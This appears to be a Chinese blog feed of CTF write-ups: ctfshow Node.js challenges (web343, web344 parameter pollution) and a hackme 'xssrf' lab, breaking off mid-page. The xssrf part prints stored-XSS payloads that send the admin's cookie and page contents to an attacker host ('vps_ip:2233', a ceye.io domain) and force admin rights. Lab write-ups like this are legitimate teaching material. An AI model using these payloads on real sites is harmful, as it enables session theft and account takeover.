class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">JSON</span>.stringify(req.body).match(<span class="regexp">/Text/ig</span>))&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;hacker go away&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    utils.copy(user.userinfo,req.body);</span><br><span class="line">    <span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>emmm 有点不懂这个 <code>JSON.stringify(req.body).match(/Text/ig)</code> 过滤有啥意义就是了。。</p><p>和web342一样的EXP</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135724797-e3a69e4c-e35c-45cb-8b3b-f009b7bf5875.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135724797-e3a69e4c-e35c-45cb-8b3b-f009b7bf5875.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135705117-aeeaaedf-c741-4609-b7b8-6deeeb29c7ae.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135705117-aeeaaedf-c741-4609-b7b8-6deeeb29c7ae.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web344-HPP"><a href="#web344-HPP" class="headerlink" title="web344 HPP"></a>web344 HPP</h2><p>代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.url.match(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="built_in">JSON</span>.parse(req.query.query);</span><br><span class="line">  <span class="keyword">if</span>(query.name===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.password===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.isVIP===<span class="literal">true</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>即 url 中不能包含大小写 <code>8c</code>、<code>2c</code> 和 <code>逗号</code></p><p>先构造一个正常请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>发现题目会过滤掉逗号，尝试 URL 编码， <code>urlencode(&quot;,&quot;) = %2c</code> 发现 <code>2c</code> 也被过滤</p><p>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的，下面链接列举了一些</p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p><p>nodejs 会把同名参数以数组的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620111020476-d1326765-9e08-4ca0-91a0-843108b9d1a7.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620111020476-d1326765-9e08-4ca0-91a0-843108b9d1a7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>因此构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>这里把 c进行url编码，是因为 双引号 的url编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620110431999-899531ed-35db-4397-b93a-2e8bbee72029.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620110431999-899531ed-35db-4397-b93a-2e8bbee72029.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><hr><p><strong>一些参考的题解</strong></p><div class="note link green"><p><a href="https://blog.csdn.net/solitudi/article/details/111669500">https://blog.csdn.net/solitudi/article/details/111669500</a> <a href="https://blog.csdn.net/miuzzx/article/details/111780832">https://blog.csdn.net/miuzzx/article/details/111780832</a></p></div><div class="note link green"><p><a href="http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d">http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d</a></p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctfshow </category>
          
          <category> ctf练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfshow </tag>
            
            <tag> ctf练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS &amp; SSRF组合拳</title>
      <link href="//p/2021/xssrf/"/>
      <url>//p/2021/xssrf/</url>
      
        <content type="html"><![CDATA[<p>去年实习中就遇到一个场景，用 xss 去打 redis，想着刷刷靶场练习一下，然后就在收藏夹吃了一年的灰了。。</p><p><a href="https://xssrf.hackme.inndy.tw/">https://xssrf.hackme.inndy.tw/</a></p><p>即下面链接的 38 - 40 题</p><p><a href="https://hackme.inndy.tw/scoreboard">https://hackme.inndy.tw/scoreboard</a></p><p>扫描一下目录，发现 robots.txt 里有三条信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /you/cant/read/config.php/can/you?</span><br><span class="line">Disallow: /backup.zip</span><br></pre></td></tr></table></figure><p>发现 backup.zip 有密码打不开</p><h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h2><p>随便用个帐号注册登录一下，在 Mailbox 收到管理员发来的邮件</p><blockquote><p>I am admin from this website, I will read all your mails but never reply.</p></blockquote><p>也就是会一直读我发的邮件，但是不会回复，也就是没有回显。</p><p>直接上 payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure><p>这里用 <code>svg/onload</code> 是为了绕过空格限制</p><p><img src="/img/xssrf/image-20210426140240792.png" class="lazyload" data-srcset="/img/xssrf/image-20210426140240792.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426140240792"></p><p>可以正常通信</p><p><img src="/img/xssrf/image-20210426104532271.png" class="lazyload" data-srcset="/img/xssrf/image-20210426104532271.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426104532271"></p><p>获取管理员 Cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/xssrf/image-20210426140353791.png" class="lazyload" data-srcset="/img/xssrf/image-20210426140353791.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426140353791"></p><p>奇怪，接收不到</p><p><img src="/img/xssrf/image-20210426105959581.png" class="lazyload" data-srcset="/img/xssrf/image-20210426105959581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426105959581"></p><p>但通过导航栏 Sent Mail 可以获取自己的。。。试试通过接收平台来接收 </p><p><a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://c6i7bf.ceye.io/&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p>只有 dns 解析记录，没有 http 请求记录。。XSS平台Cookie字段为空。。。</p><p>奇怪了，然后试试</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cooki&quot;&gt;</span><br></pre></td></tr></table></figure><p>发现返回正常，难道，过滤了cookie关键字？或者，，Cookie里的特殊字段导致 HTTP包异常？尝试对获取到的 cookie 进行编码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>为啥用 <code>btoa</code> 呢，因为一开始试过了 <code>escape</code> 不过没用… <code>escape</code> 后 Cookie里也没空格的样子emmm</p></blockquote><p>因为题目过滤了 <code>)</code> ，所以需要HTML编码一下双引号里面的。</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="/img/xssrf/image-20210426135624410.png" class="lazyload" data-srcset="/img/xssrf/image-20210426135624410.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426135624410"></p><p>好耶！</p><p><img src="/img/xssrf/image-20210426135720662.png" class="lazyload" data-srcset="/img/xssrf/image-20210426135720662.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426135720662"></p><p><img src="/img/xssrf/image-20210426140635038.png" class="lazyload" data-srcset="/img/xssrf/image-20210426140635038.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426140635038"></p><p>第一个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;&#125;</span><br></pre></td></tr></table></figure><p>并提示了第二个 flag 在 redis 里</p><h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h2><p>尝试用 xssme 得到的 admin cookie ，尝试 XFF 也是如此。</p><p><img src="/img/xssrf/image-20210426142206757.png" class="lazyload" data-srcset="/img/xssrf/image-20210426142206757.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426142206757"></p><p>这里先读一下 admin 页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure><p>同样引号里的东西HTML编码一下给管理员发邮件</p><p><img src="/img/xssrf/image-20210426145107589.png" class="lazyload" data-srcset="/img/xssrf/image-20210426145107589.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426145107589"></p><p>正常收到</p><p><img src="/img/xssrf/image-20210426145140680.png" class="lazyload" data-srcset="/img/xssrf/image-20210426145140680.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426145140680"></p><p>把这一串 base64解码一下，提取关键信息，发现主要多了 Set Admin 和 Send Request 两个功能。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;navbar-nav&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;sendmail.php&quot;</span>&gt;</span>Send Mail<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mailbox.php&quot;</span>&gt;</span>Mailbox<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;sentmail.php&quot;</span>&gt;</span>Sent Mail<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;setadmin.php&quot;</span>&gt;</span>Set Admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;request.php&quot;</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过 AJAX 请求分别请求一下 <code>setadmin.php</code> 和 <code>request.php</code> 看看</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>一样HTML编码一下双引号里面的部分，同样在导航栏 <code>Send Mail</code> 部分发送</p><p><img src="/img/xssrf/image-20210426144401815.png" class="lazyload" data-srcset="/img/xssrf/image-20210426144401815.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210426144401815"></p><p>base64解码提取关键部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/request.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;url&quot;</span>&gt;</span>URL<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span> <span class="attr">aria-describedby</span>=<span class="string">&quot;url&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;URL&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还有 <code>setadmin.php</code> 同样，结果 base64解码 提取关键部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/setadmin.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">aria-describedby</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Give Admin Access<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里试试能不能通过 <code>setadmin.php</code> 设置管理员，之后操作也方式一点点。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;username=tari&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>得到返回信息…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-warning&quot;</span>&gt;</span>This user is already a admin.<span class="tag">&lt;/<span 